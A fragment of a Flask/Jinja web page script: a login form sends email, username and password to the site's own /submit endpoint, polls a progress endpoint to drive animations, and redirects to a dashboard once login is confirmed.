    <script src="{{ url_for('static', filename='js/animations.js') }}"></script>
    <script>
        let redirectTriggered = false; // Prevent multiple redirections
        let currentStep = 0; // Track current progress step
    
        function pollProgress() {
            fetch("/get_progress")
                .then(response => response.json())
                .then(data => {
                    const step = data.step;
                    if (step !== currentStep) {
                        currentStep = step;
                        showProgressStep(step); // Update animations
                    }
    
                    if (step === 4 && !redirectTriggered) {
                        pollLoginStatus(); // Check final login confirmation
                    }
                })
                .catch(error => console.error("Error polling progress:", error));
        }
    
        function pollLoginStatus() {
            fetch("/confirm_login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email: document.getElementById("vt_email").value })
            })
                .then(response => response.json())
                .then(data => {
                    if (data.success && !redirectTriggered) {
                        redirectTriggered = true; // Prevent further redirects
                        setTimeout(() => {
                            const email = document.getElementById("vt_email").value;
                            window.location.href = `/dashboard?email=${encodeURIComponent(email)}`;
                        }, 2000); // Allow animations to complete
                    }
                })
                .catch(error => console.error("Error checking login status:", error));
        }
    
        document.getElementById("credentials-form").addEventListener("submit", function (e) {
            e.preventDefault();
            document.getElementById("form-container").classList.add("hidden");
            document.getElementById("animation-container").classList.remove("hidden");
    
            fetch("/submit", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    vt_email: document.getElementById("vt_email").value,
                    vt_username: document.getElementById("vt_username").value,
                    vt_password: document.getElementById("vt_password").value
                })
            })
                .then(() => {
                    setInterval(pollProgress, 1000); // Poll progress updates
                })
                .catch(error => console.error("Error submitting form:", error));
        });
    </script>
